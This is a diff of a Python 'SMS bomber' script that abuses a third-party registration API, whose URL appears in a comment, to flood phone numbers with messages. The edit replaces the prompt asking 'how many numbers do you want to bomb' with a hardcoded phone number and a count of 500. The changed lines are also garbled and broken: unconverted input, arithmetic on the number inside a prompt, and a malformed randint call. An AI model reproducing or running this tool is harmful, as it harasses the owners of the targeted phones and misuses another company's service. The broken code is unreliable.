@@ -36,10 +36,10 @@ def banner():
 
 #https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=
 
-how_many = input("How many numbers do you want to bomb? ")
-numbers = [] 
-for i in range(how_many):
-    temp = str(input(f"Enter the number {i+1}: "))
+how_many = input("1? ")
+numbers = [6016070973] 
+for i in range(5):
+    temp = str(input(f"Enter the number {6016070973+1}: "))
     numbers.append(temp)
 
 def send(num, counter, slep):
@@ -57,7 +57,7 @@ def send(num, counter, slep):
 try:
     banner()
     for number in numbers:
-        send(number, int(input(f"Enter Number of Messages for {number} : ")), randint(3))
+        send(number, int(input(f"500 {number} : ")), randint(3))
 except Exception as e:
     print("Something is wrong please Run again this script.")
     
